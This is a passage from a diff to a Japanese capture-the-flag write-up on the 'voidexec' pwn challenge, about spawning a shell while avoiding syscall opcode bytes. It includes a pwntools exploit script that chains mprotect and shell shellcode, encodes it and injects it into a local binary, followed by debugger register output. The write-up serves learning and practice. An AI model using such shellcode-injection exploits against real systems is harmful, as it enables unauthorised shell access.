@@ -84,3 +84,44 @@ encoded_shellcode = encode(shellcode, avoid=b"\x0f\xcd")
 ```
 0xc0de0014    stosb  byte ptr [rdi], al
 ```
+
+禁止バイトを使わずにシェルを起動する方法を調べたが見つからなかった。
+
+では、mprotectを再度呼び出して読み書き可能に戻すことは可能か？  
+→ shellcraft.mprotectがあることを知る。
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.update(os="linux", arch="amd64", log_level="error")
+
+#r = remote("localhost", 5002)
+p = process('./voidexec')
+
+mprotect_code = shellcraft.mprotect(0xc0de0000, 100, 7)
+shellcode = shellcraft.sh()
+
+full_code = asm(mprotect_code + shellcode)
+
+encoded_shellcode = encode(full_code, avoid=b"\x0f\xcd")
+print(encoded_shellcode)
+
+p.recvuntil(b"Send to void execution: \n")
+p.sendline(encoded_shellcode)
+p.interactive()
+```
+
+しかし、これも結局[内部的には](https://github.com/arthaud/python3-pwntools/blob/7519197918/pwnlib/shellcraft/templates/amd64/linux/mprotect.asm) syscall を呼び出しているので最後に `\x0f\x05` が含まれてしまうし、avoid=b"\x0f\xcd"を使ったら同じように読み書き禁止のためセグメンテーションエラーになる。
+
+このcallにステップインした直後のレジスタを見ると、
+```c
+(*__s)();
+```
+
+RCX にmprotect+11のアドレスが入っていることが分かる。
+
+```
+ RCX  0x7ffff7d1e8bb (mprotect+11) ◂— cmp rax, -0xfff
+```
